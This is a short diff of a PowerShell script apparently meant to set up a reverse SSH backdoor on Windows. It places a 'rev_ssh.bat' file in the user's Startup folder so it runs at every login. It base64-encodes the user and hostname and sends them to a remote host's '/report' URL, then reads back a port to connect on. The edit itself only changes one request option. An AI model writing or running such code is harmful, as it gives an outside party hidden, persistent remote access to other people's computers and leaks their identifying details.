@@ -44,13 +44,12 @@ $logFile = "$userProfile\rev_ssh.log"
 #$batFilePath = "$neutralPath\rev_ssh.bat"
 $batFilePath = "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rev_ssh.bat"
 
-
 # Encode the data as base64 without newline
 $data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$username`:$hostname"))
 
 # Request port to backend
 $domain_name = "$remote_host"
-$response = Invoke-RestMethod -Uri "https://$domain_name/report?data=$data" -UseBasicParsing
+$response = Invoke-RestMethod -Uri "https://$domain_name/report?data=$data" -Method Get
 
 # Clean response (remove any percent signs)
 $received_port = $response -replace '%', ''
